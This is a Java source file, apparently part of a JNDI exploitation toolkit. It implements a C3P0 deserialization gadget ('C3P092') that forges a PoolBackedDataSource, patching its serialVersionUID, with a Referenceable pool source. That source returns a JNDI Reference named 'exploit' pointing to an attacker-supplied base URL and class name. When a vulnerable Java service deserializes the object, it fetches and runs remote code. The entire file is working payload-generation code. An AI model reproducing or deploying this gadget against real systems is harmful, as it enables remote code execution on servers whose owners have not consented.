package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Reflections;
import com.nu1r.jndi.gadgets.utils.SuClassLoader;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

/**
 * C3P0 通过Tomcat 的 getObjectInstance 方法调用 ELProcessor 的 eval 方法实现表达式注入
 */
public class C3P092 implements ObjectPayload<Object> {

    public Object getObject(PayloadType type, String... param) throws Exception {
        String command = param[0];
        int    sep     = command.lastIndexOf(':');
        if (sep < 0) {
            throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
        }

        String url       = command.substring(0, sep);
        String className = command.substring(sep + 1);

        // 修改com.mchange.v2.c3p0.PoolBackedDataSource serialVerisonUID

        ClassPool pool = new ClassPool();
        pool.insertClassPath(new ClassClassPath(Class.forName("com.mchange.v2.c3p0.PoolBackedDataSource")));
        final CtClass ctPoolBackedDataSource = pool.get("com.mchange.v2.c3p0.PoolBackedDataSource");

        try {
            CtField ctSUID = ctPoolBackedDataSource.getDeclaredField("serialVersionUID");
            ctPoolBackedDataSource.removeField(ctSUID);
        } catch (javassist.NotFoundException e) {
        }
        ctPoolBackedDataSource.addField(CtField.make("private static final long serialVersionUID = 7387108436934414104L;", ctPoolBackedDataSource));

        // mock method name until armed
        final Class clsPoolBackedDataSource = ctPoolBackedDataSource.toClass(new SuClassLoader());

        Object b = Reflections.createWithoutConstructor(clsPoolBackedDataSource);
        Reflections.getField(clsPoolBackedDataSource, "connectionPoolDataSource").set(b, new PoolSource(className, url));
        return b;
    }


    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String className;

        private String url;

        public PoolSource(String className, String url) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference() throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }

        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        public void setLogWriter(PrintWriter out) throws SQLException {
        }

        public void setLoginTimeout(int seconds) throws SQLException {
        }

        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }

        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }
    }

}
